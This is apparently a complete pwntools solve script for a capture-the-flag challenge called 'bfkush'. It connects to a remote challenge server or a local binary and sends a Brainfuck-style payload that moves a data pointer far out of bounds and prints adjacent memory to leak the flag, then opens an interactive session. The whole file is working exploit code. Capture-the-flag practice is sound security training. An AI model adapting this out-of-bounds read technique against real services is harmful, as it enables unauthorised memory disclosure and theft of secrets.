from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./bfkush")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	p = remote("chal.420blaze.in","42001")

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xE44)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
payload = ">" * 0x7530
payload += ".>"*0x50
p.sendline(payload)
flag = p.recvuntil("}")
print flag
p.sendline()
p.interactive()
